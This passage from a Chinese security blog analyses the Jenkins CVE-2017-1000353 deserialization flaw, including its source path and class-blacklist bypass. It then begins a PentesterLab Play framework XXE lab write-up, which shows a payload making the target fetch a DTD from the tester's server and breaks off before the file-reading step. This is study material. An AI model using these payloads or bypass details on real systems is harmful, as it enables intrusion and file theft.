Stapler.getCurrentRequest();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (req.getRestOfPath().length()==<span class=\"number\">0</span> &amp;&amp; <span class=\"string\">\"POST\"</span>.equals(req.getMethod())) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// CLI connection request</span></span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> CliEndpointResponse();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CliEndpointResponse</span> <span class=\"keyword\">extends</span> <span class=\"title\">HttpResponseException</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">generateResponse</span><span class=\"params\">(StaplerRequest req, StaplerResponse rsp, Object node)</span> <span class=\"keyword\">throws</span> IOException, ServletException </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">// do not require any permission to establish a CLI connection</span></span><br><span class=\"line\">                <span class=\"comment\">// the actual authentication for the connecting Channel is done by CLICommand</span></span><br><span class=\"line\"></span><br><span class=\"line\">                UUID uuid = UUID.fromString(req.getHeader(<span class=\"string\">\"Session\"</span>));</span><br><span class=\"line\">                rsp.setHeader(<span class=\"string\">\"Hudson-Duplex\"</span>,<span class=\"string\">\"\"</span>); <span class=\"comment\">// set the header so that the client would know</span></span><br><span class=\"line\"></span><br><span class=\"line\">                FullDuplexHttpChannel server;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(req.getHeader(<span class=\"string\">\"Side\"</span>).equals(<span class=\"string\">\"download\"</span>)) &#123;</span><br><span class=\"line\">                    duplexChannels.put(uuid,server=<span class=\"keyword\">new</span> FullDuplexHttpChannel(uuid, !Jenkins.getActiveInstance().hasPermission(Jenkins.ADMINISTER)) &#123;</span><br><span class=\"line\">                        <span class=\"meta\">@Override</span></span><br><span class=\"line\">                        <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(Channel channel)</span> <span class=\"keyword\">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class=\"line\">                            <span class=\"comment\">// capture the identity given by the transport, since this can be useful for SecurityRealm.createCliAuthenticator()</span></span><br><span class=\"line\">                            channel.setProperty(CLICommand.TRANSPORT_AUTHENTICATION, Jenkins.getAuthentication());</span><br><span class=\"line\">                            channel.setProperty(CliEntryPoint.class.getName(),<span class=\"keyword\">new</span> CliManagerImpl(channel));</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;);</span><br><span class=\"line\">                    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                        server.download(req,rsp);</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                        duplexChannels.remove(uuid);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    duplexChannels.get(uuid).upload(req,rsp);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IOException(e);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从上述代码可知，建立一对双向通道(download/upload), 需要发送两次POST请求，根据请求头Session字段的值uuid识别不同的双向通道，Side字段的值识别download或upload通道，请求发送的顺序是先发送download请求再发送upload请求，跟进<code>download</code>函数(<code>/Users/js/IdeaProjects/vulnhub/jenkins-2.46.1/core/src/main/java/hudson/model/FullDuplexHttpChannel.java</code>), 当服务器收到download请求时会阻塞请求，等待upload请求，收到upload请求后，新建Channel对象处理upload请求和返回响应，代码如下:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">void</span> <span class=\"title\">download</span><span class=\"params\">(StaplerRequest req, StaplerResponse rsp)</span> <span class=\"keyword\">throws</span> InterruptedException, IOException </span>&#123;</span><br><span class=\"line\">\t\t......</span><br><span class=\"line\"></span><br><span class=\"line\">       &#123;<span class=\"comment\">// wait until we have the other channel</span></span><br><span class=\"line\">           <span class=\"keyword\">long</span> end = System.currentTimeMillis() + CONNECTION_TIMEOUT;</span><br><span class=\"line\">           <span class=\"keyword\">while</span> (upload == <span class=\"keyword\">null</span> &amp;&amp; System.currentTimeMillis()&lt;end)</span><br><span class=\"line\">               wait(<span class=\"number\">1000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">           <span class=\"keyword\">if</span> (upload==<span class=\"keyword\">null</span>)</span><br><span class=\"line\">               <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IOException(<span class=\"string\">\"HTTP full-duplex channel timeout: \"</span>+uuid);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">           channel = <span class=\"keyword\">new</span> Channel(<span class=\"string\">\"HTTP full-duplex channel \"</span> + uuid,</span><br><span class=\"line\">                   Computer.threadPoolForRemoting, Mode.BINARY, upload, out, <span class=\"keyword\">null</span>, restricted);</span><br><span class=\"line\">\t     ......</span><br><span class=\"line\">       &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">           <span class=\"comment\">// publish that we are done</span></span><br><span class=\"line\">           completed=<span class=\"keyword\">true</span>;</span><br><span class=\"line\">           notify();</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">void</span> <span class=\"title\">upload</span><span class=\"params\">(StaplerRequest req, StaplerResponse rsp)</span> <span class=\"keyword\">throws</span> InterruptedException, IOException </span>&#123;</span><br><span class=\"line\">       rsp.setStatus(HttpServletResponse.SC_OK);</span><br><span class=\"line\">       InputStream in = req.getInputStream();</span><br><span class=\"line\">       <span class=\"keyword\">if</span>(DIY_CHUNKING)    in = <span class=\"keyword\">new</span> ChunkedInputStream(in);</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"comment\">// publish the upload channel</span></span><br><span class=\"line\">       upload = in;</span><br><span class=\"line\">       notify();</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"comment\">// wait until we are done</span></span><br><span class=\"line\">       <span class=\"keyword\">while</span> (!completed)</span><br><span class=\"line\">           wait();</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n<p>以上就是建立双向通道的基本过程。</p>\n<h3 id=\"Channel对象启动ReaderThread\"><a href=\"#Channel对象启动ReaderThread\" class=\"headerlink\" title=\"Channel对象启动ReaderThread\"></a>Channel对象启动ReaderThread</h3><p>upload请求作为输入流实例化Channel对象(<code>~/.m2/repository/org/jenkins-ci/main/remoting/3.7/remoting-3.7-sources.jar!/hudson/remoting/Channel.java</code>), Channel类的构造链比较繁琐如下图，<br><img src=\"/2017/05/05/Jenkins-未授权远程代码执行漏洞-CVE-2017-1000353/Channel.png\"></p>\n<p>最终调用的构造方法为<code>Channel(ChannelBuilder settings, CommandTransport transport)</code>, 该构造方法的transport参数，由ChannelBuilder类的negotiate()方法获得。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> CommandTransport <span class=\"title\">negotiate</span><span class=\"params\">(<span class=\"keyword\">final</span> InputStream is, <span class=\"keyword\">final</span> OutputStream os)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">\t\t  ......</span><br><span class=\"line\">        &#123;<span class=\"comment\">// read the input until we hit preamble</span></span><br><span class=\"line\">            Mode[] modes=&#123;Mode.BINARY,Mode.TEXT&#125;;</span><br><span class=\"line\">            <span class=\"keyword\">byte</span>[][] preambles = <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[][]&#123;Mode.BINARY.preamble, Mode.TEXT.preamble, Capability.PREAMBLE&#125;;</span><br><span class=\"line\">            <span class=\"keyword\">int</span>[] ptr=<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[<span class=\"number\">3</span>];</span><br><span class=\"line\">            Capability cap = <span class=\"keyword\">new</span> Capability(<span class=\"number\">0</span>); <span class=\"comment\">// remote capacity that we obtained. If we don't hear from remote, assume no capability</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">while</span>(<span class=\"keyword\">true</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">int</span> ch = is.read();</span><br><span class=\"line\">                ......</span><br><span class=\"line\">                <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;preambles.length;i++) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">byte</span>[] preamble = preambles[i];</span><br><span class=\"line\">                    <span class=\"keyword\">if</span>(preamble[ptr[i]]==ch) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span>(++ptr[i]==preamble.length) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">switch</span> (i) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">case</span> <span class=\"number\">0</span>:</span><br><span class=\"line\">                            <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">                                ......</span><br><span class=\"line\">                                <span class=\"keyword\">return</span> makeTransport(is, os, mode, cap);</span><br><span class=\"line\">                            <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">                                cap = Capability.read(is);</span><br></pre></td></tr></table></figure>\n<p>negotiate()会检查输入(upload请求)的前导码, 所有发往Jenkins CLI的命令中都包含某种格式的前导码（preamble），前导码格式通常为：<code>&lt;===[JENKINS REMOTING CAPACITY]===&gt;rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4=</code>, 该前导码包含一个经过base64编码的序列化对象。“Capability”类型的序列化对象的功能是告诉服务器客户端具备哪些具体功能（比如HTTP分块编码功能）。</p>\n<p>最后调用makeTransport()方法返回<code>CommandTransport</code>对象, 根据cap是否支持<code>Chunking</code>返回不同的对象<code>ChunkedCommandTransport</code>或<code>ClassicCommandTransport</code>。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> CommandTransport <span class=\"title\">makeTransport</span><span class=\"params\">(InputStream is, OutputStream os, Mode mode, Capability cap)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">    FlightRecorderInputStream fis = <span class=\"keyword\">new</span> FlightRecorderInputStream(is);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (cap.supportsChunking())</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> ChunkedCommandTransport(cap, mode.wrap(fis), mode.wrap(os), os);</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(mode.wrap(os));</span><br><span class=\"line\">        oos.flush();    <span class=\"comment\">// make sure that stream preamble is sent to the other end. avoids dead-lock</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> ClassicCommandTransport(</span><br><span class=\"line\">                <span class=\"keyword\">new</span> ObjectInputStreamEx(mode.wrap(fis),getBaseLoader(),getClassFilter()),</span><br><span class=\"line\">                oos,fis,os,cap);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>利用SSD的PoC脚本发送的upload请求返回的是<code>ClassicCommandTransport</code>对象，其继承关系如下图所示。</p>\n<img src=\"/2017/05/05/Jenkins-未授权远程代码执行漏洞-CVE-2017-1000353/CmdT.png\">\n<p>Channel构造函数<code>Channel(ChannelBuilder settings, CommandTransport transport)</code>中, transport.setup()调用SynchronousCommandTransport类的setup()方法来启动一个ReaderThread线程。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">setup</span><span class=\"params\">(Channel channel, CommandReceiver receiver)</span> </span>&#123;</span><br><span class=\"line\">       <span class=\"keyword\">this</span>.channel = channel;</span><br><span class=\"line\">       <span class=\"keyword\">new</span> ReaderThread(receiver).start();</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"读取Command对象\"><a href=\"#读取Command对象\" class=\"headerlink\" title=\"读取Command对象\"></a>读取Command对象</h3><p>通过上面的ReaderThread.start()方法启动一个线程，ReaderThread为SynchronousCommandTransport类的内部类，在run()方法中，调用<code>ClassicCommandTransport</code>类的read()方法读取输入，read()方法实际是调用Command类的readFrom()方法读取，通过反序列化输入返回一个Command对象。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ReaderThread</span> <span class=\"keyword\">extends</span> <span class=\"title\">Thread</span> </span>&#123;</span><br><span class=\"line\">        ......</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ReaderThread</span><span class=\"params\">(CommandReceiver receiver)</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">super</span>(<span class=\"string\">\"Channel reader thread: \"</span>+channel.getName());</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.receiver = receiver;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">final</span> String name =channel.getName();</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">while</span>(!channel.isInClosed()) &#123;</span><br><span class=\"line\">                    Command cmd = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">                    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                        cmd = read();</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> Command <span class=\"title\">read</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">          Command cmd = Command.readFrom(channel, ois);</span><br></pre></td></tr></table></figure>\n<img src=\"/2017/05/05/Jenkins-未授权远程代码执行漏洞-CVE-2017-1000353/cmd.png\">\n<p>在反序列化输入返回一个Command对象时就执行了cmd命令，而不是通过正常的回调handle()方法执行cmd命令，反序列化导致的执行代码触发的相关异常如下:</p>\n<img src=\"/2017/05/05/Jenkins-未授权远程代码执行漏洞-CVE-2017-1000353/except.png\">\n<p> 类型转换异常<code>ClassCastException</code>: <code>org.apache.commons.collections.map.ReferenceMap cannot be cast to hudson.remoting.Command</code>.</p>\n<h3 id=\"正常执行Command\"><a href=\"#正常执行Command\" class=\"headerlink\" title=\"正常执行Command\"></a>正常执行Command</h3><p>虽说反序列化时就执行了cmd代码，这里也顺带了解下正常的执行cmd的过程。SynchronousCommandTransport类的run()方法中，获得返回的Command对象(cmd)，然后调用<code>receiver.handle(cmd);</code>处理命令，其实质是回调Channel类构造方法里面的handle方法，而传入handle方法的cmd参数就是反序列化得到的Command对象。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">transport.setup(this, new CommandReceiver() &#123;</span><br><span class=\"line\">            public void handle(Command cmd) &#123;</span><br><span class=\"line\">                ......</span><br><span class=\"line\">                try &#123;</span><br><span class=\"line\">                    cmd.execute(Channel.this);</span><br></pre></td></tr></table></figure>\n<h2 id=\"绕过黑名单保护机制\"><a href=\"#绕过黑名单保护机制\" class=\"headerlink\" title=\"绕过黑名单保护机制\"></a>绕过黑名单保护机制</h2><p>上面过程主要讲述的是漏洞触发的流程，而该漏洞的核心是反序列化Java SignedObject对象会绕过黑名单保护机制，从而导致的代码执行漏洞。</p>\n<img src=\"/2017/05/05/Jenkins-未授权远程代码执行漏洞-CVE-2017-1000353/sign.png\">\n<p>ClassFilter类定义的默认的黑名单如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> String[] DEFAULT_PATTERNS = &#123;</span><br><span class=\"line\">        <span class=\"string\">\"^bsh[.].*\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"^com[.]google[.]inject[.].*\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"^com[.]mchange[.]v2[.]c3p0[.].*\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"^com[.]sun[.]jndi[.].*\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"^com[.]sun[.]corba[.].*\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"^com[.]sun[.]javafx[.].*\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"^com[.]sun[.]org[.]apache[.]regex[.]internal[.].*\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"^java[.]awt[.].*\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"^java[.]rmi[.].*\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"^javax[.]management[.].*\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"^javax[.]naming[.].*\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"^javax[.]script[.].*\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"^javax[.]swing[.].*\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"^org[.]apache[.]commons[.]beanutils[.].*\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"^org[.]apache[.]commons[.]collections[.]functors[.].*\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"^org[.]apache[.]myfaces[.].*\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"^org[.]apache[.]wicket[.].*\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\".*org[.]apache[.]xalan.*\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"^org[.]codehaus[.]groovy[.]runtime[.].*\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"^org[.]hibernate[.].*\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"^org[.]python[.].*\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"^org[.]springframework[.](?!(\\\\p&#123;Alnum&#125;+[.])*\\\\p&#123;Alnum&#125;*Exception$).*\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"^sun[.]rmi[.].*\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"^javax[.]imageio[.].*\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"^java[.]util[.]ServiceLoader$\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"^java[.]net[.]URLClassLoader$\"</span></span><br><span class=\"line\">    &#125;;</span><br></pre></td></tr></table></figure>\n<p>黑名单机制绕过可以通过分析补丁得到印证。<br><img src=\"/2017/05/05/Jenkins-未授权远程代码执行漏洞-CVE-2017-1000353/fix.png\"></p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><a href=\"http://www.securityfocus.com/bid/98056\" target=\"_blank\" rel=\"noopener\">http://www.securityfocus.com/bid/98056</a></li>\n<li><a href=\"https://blogs.securiteam.com/index.php/archives/3171\" target=\"_blank\" rel=\"noopener\">https://blogs.securiteam.com/index.php/archives/3171</a></li>\n<li><a href=\"https://jenkins.io/security/advisory/2017-04-26/\" target=\"_blank\" rel=\"noopener\">https://jenkins.io/security/advisory/2017-04-26/</a></li>\n<li><a href=\"https://github.com/jenkinsci/jenkins/commit/36b8285a41eb28333549e8d851f81fd80a184076\" target=\"_blank\" rel=\"noopener\">https://github.com/jenkinsci/jenkins/commit/36b8285a41eb28333549e8d851f81fd80a184076</a></li>\n<li><a href=\"https://github.com/jenkinsci/jenkins/commit/f237601afd750a0eaaf961e8120b08de238f2c3f\" target=\"_blank\" rel=\"noopener\">https://github.com/jenkinsci/jenkins/commit/f237601afd750a0eaaf961e8120b08de238f2c3f</a></li>\n<li><a href=\"http://www.lilihongblog.com/Blog/jenkins+Slave+Receiving+Remote+Request\" target=\"_blank\" rel=\"noopener\">http://www.lilihongblog.com/Blog/jenkins+Slave+Receiving+Remote+Request</a></li>\n</ul>\n","categories":["Web安全"],"tags":["反序列化","JAVA"]},{"title":"play渗透框架XXE实体攻击","url":"http://www.beesfun.com/2017/04/21/play渗透框架XXE实体攻击/","content":"<h2 id=\"简要介绍\"><a href=\"#简要介绍\" class=\"headerlink\" title=\"简要介绍\"></a>简要介绍</h2><p>本文记录的是利用play渗透框架学习XXE实体攻击的过程，实验环境来自于<a href=\"https://pentesterlab.com/exercises/play_xxe\" target=\"_blank\" rel=\"noopener\">pentesterlab Play XML Entities</a>, 下载页面的iso, 用虚拟机软件PD或vmvare安装即可。打开虚拟机，获取虚拟机ip地址，然后访问就可以实验了，并不需要开启服务等其他操作，非常简单易用。同时还配备了课程讲解<a href=\"https://pentesterlab.com/exercises/play_xxe/course\" target=\"_blank\" rel=\"noopener\">https://pentesterlab.com/exercises/play_xxe/course</a>.</p>\n<p>Play Framework是一个web的框架，在这个框架中，开发者可以快速的使用java或者scala编译开发web应用。这样可以有序管理代码，并且url可以像Ruby-on-Rails一样被映射。就像Ruby-on-Rails，当收到Http请求时，Play框架管理多种文本类型。</p>\n<a id=\"more\"></a>\n<h2 id=\"信息获取\"><a href=\"#信息获取\" class=\"headerlink\" title=\"信息获取\"></a>信息获取</h2><p>目标ip: <code>10.211.15.4</code>, 访问如下:</p>\n<img src=\"/2017/04/21/play渗透框架XXE实体攻击/login.png\">\n<p>练习的目标是: <code>读任意文件</code>, <code>获取secret_url</code>, <code>login as admin</code>。</p>\n<h2 id=\"实体攻击\"><a href=\"#实体攻击\" class=\"headerlink\" title=\"实体攻击\"></a>实体攻击</h2><h3 id=\"探测外部实体请求\"><a href=\"#探测外部实体请求\" class=\"headerlink\" title=\"探测外部实体请求\"></a>探测外部实体请求</h3><p>首先测试目标服务器是否解析XML内容，并请求外部实体。本地开启服务器，接收来自目标服务器的外部实体请求：<code>python -m SimpleHTTPServer 8000</code>, 然后burp发送如下请求</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /login HTTP/1.1</span><br><span class=\"line\">Host: 10.211.55.14</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class=\"line\">Referer: http://10.211.55.14/login</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Content-Type: text/xml</span><br><span class=\"line\">Content-Length: 96</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE foo SYSTEM &quot;http://10.211.55.2:8000/test.dtd&quot;&gt;</span><br><span class=\"line\">&lt;foo&gt;&amp;e1;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>\n<p>本地监听到如下内容，表明目标服务器解析XML内容，并发出了外部实体请求。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.211.55.14 - - [21/Apr/2017 11:29:17] code 404, message File not found</span><br><span class=\"line\">10.211.55.14 - - [21/Apr/2017 11:29:17] &quot;GET /test.dtd HTTP/1.1&quot; 404 -</span><br></pre></td></tr></table></figure>\n<p>注意: burp发出的请求的<code>Content-Type</code>必须为: <code>text/xml</code>, 而不能是<code>application/xml</code>, 猜测是目标服务器限制了解析的xml mime类型。</p>\n<h3 id=\"任意文件读取\"><a href=\"#任意文件读取\" class=\"headerlink\" title=\"任意文件读取\"></a>任意文件读取</h3><p>目标服务器会请求外部实体，那么可以本地写test.dtd, 返回给目标服务器，test.dtd内容如下。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span 